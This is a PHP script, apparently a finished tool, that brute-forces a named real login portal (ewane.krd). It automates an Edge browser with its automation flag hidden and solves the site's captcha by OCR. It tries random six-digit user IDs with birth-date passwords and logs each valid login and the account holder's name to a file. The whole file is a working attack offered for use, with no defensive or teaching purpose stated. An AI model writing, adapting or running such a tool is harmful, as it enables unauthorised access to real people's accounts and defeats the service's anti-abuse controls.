<?php
require_once('vendor/autoload.php');

use Facebook\WebDriver\Remote\RemoteWebDriver;
use Facebook\WebDriver\Remote\DesiredCapabilities;
use Facebook\WebDriver\Chrome\ChromeOptions;
use Facebook\WebDriver\WebDriverBy;

class EwaneUltimateTool {
    private $serverUrl = 'http://localhost:4444';
    private $loginUrl  = 'https://www.ewane.krd/LoginEP';
    private $userDataDir = "C:\\Users\\Lenovo\\AppData\\Local\\Microsoft\\Edge\\User Data";
    private $driver;
    private $stats = ['checked' => 0, 'success' => 0, 'error' => 0];

    public function clear() {
        echo (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "\x1B[2J\x1B[H" : system('clear');
    }

    private function generateBirthPassword() {
        $day = str_pad(rand(1, 31), 2, '0', STR_PAD_LEFT);
        $month = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
        $year = rand(2000, 2020);
        return $day . $month . $year;
    }

    public function menu() {
        $this->clear();
        echo "\033[1;33m" . str_repeat("=", 50) . "\033[0m" . PHP_EOL;
        echo "\033[1;36m       EWANE BRUTE-FORCE ENGINE v3.0\033[0m" . PHP_EOL;
        echo "\033[1;33m" . str_repeat("=", 50) . "\033[0m" . PHP_EOL;
        echo " [1] Manual Login (Single)" . PHP_EOL;
        echo " [2] Auto Brute-Force (Random User + Birth Pass)" . PHP_EOL;
        echo " [3] Exit" . PHP_EOL;
        echo "\033[1;33m" . str_repeat("-", 50) . "\033[0m" . PHP_EOL;
        echo " Choice: ";
        
        $c = trim(fgets(STDIN));
        if ($c == '1') $this->run('manual');
        elseif ($c == '2') $this->run('auto');
        else exit;
    }

    private function init() {
        if ($this->driver) return;
        $o = new ChromeOptions();
        $o->addArguments(["--user-data-dir=" . $this->userDataDir, "--profile-directory=Default", "--start-maximized", "--disable-blink-features=AutomationControlled"]);
        $cap = DesiredCapabilities::microsoftEdge();
        $cap->setCapability(ChromeOptions::CAPABILITY, $o);
        $this->driver = RemoteWebDriver::create($this->serverUrl, $cap);
    }

    private function solve() {
        $this->driver->executeScript("document.getElementById('captchaRefreshBtn').click();");
        sleep(2);
        $data = $this->driver->executeScript("return document.getElementById('captchaCanvas').toDataURL('image/png').substring(22);");
        $path = __DIR__ . DIRECTORY_SEPARATOR . 'live.png';
        $src = imagecreatefromstring(base64_decode($data));
        $w = imagesx($src); $h = imagesy($src);
        $dst = imagecreatetruecolor($w * 2, $h * 2);
        imagefill($dst, 0, 0, imagecolorallocate($dst, 255, 255, 255));
        imagecopyresampled($dst, $src, 0, 0, 0, 0, $w * 2, $h * 2, $w, $h);
        imagepng($dst, $path);
        imagedestroy($src); imagedestroy($dst);
        return trim(shell_exec("python -c \"import ddddocr; ocr = ddddocr.DdddOcr(show_ad=False, beta=True); print(ocr.classification(open(r'$path', 'rb').read()))\""));
    }

    private function run($m) {
        $this->init();
        while (true) {
            if ($m == 'manual') {
                echo " User: "; $u = trim(fgets(STDIN));
                echo " Pass: "; $p = trim(fgets(STDIN));
            } else {
                $u = rand(100000, 999999);
                $p = $this->generateBirthPassword();
            }

            $this->driver->get($this->loginUrl);
            while (true) {
                $this->stats['checked']++;
                echo "\r \033[1;34mChecking:\033[0m $u:$p | \033[1;32mHit:\033[0m {$this->stats['success']} | \033[1;31mBad:\033[0m {$this->stats['error']}   ";
                
                $cap = $this->solve();
                if (empty($cap)) continue;

                $this->driver->executeScript("
                    document.getElementById('Input_Email').value = '$u';
                    document.getElementById('Input_Password').value = '$p';
                    document.getElementById('Input_CaptchaInput').value = '$cap';
                    document.querySelector('button.login100-form-btn').click();
                ");

                sleep(4);
                $src = $this->driver->getPageSource();

                if (strpos($src, 'Invalid captcha code') !== false) continue;
                
                if (strpos($src, 'Invalid Login') !== false) {
                    $this->stats['error']++;
                    if ($m == 'manual') { $this->menu(); return; }
                    break;
                } else {
                    $this->stats['success']++;
                    try {
                        $name = $this->driver->findElement(WebDriverBy::cssSelector('a.me-3.py-2.text-light.text-decoration-none'))->getText();
                        echo PHP_EOL . "\033[1;42m [+] VALID | USER: $u | PASS: $p | NAME: $name \033[0m" . PHP_EOL;
                        file_put_contents('hits.txt', "User: $u | Pass: $p | Name: $name" . PHP_EOL, FILE_APPEND);
                    } catch (Exception $e) {
                        echo PHP_EOL . "\033[1;42m [+] VALID | USER: $u | PASS: $p \033[0m" . PHP_EOL;
                        file_put_contents('hits.txt', "User: $u | Pass: $p" . PHP_EOL, FILE_APPEND);
                    }
                    if ($m == 'manual') { fgets(STDIN); $this->menu(); return; }
                    break;
                }
            }
        }
    }
}

$t = new EwaneUltimateTool();
$t->menu();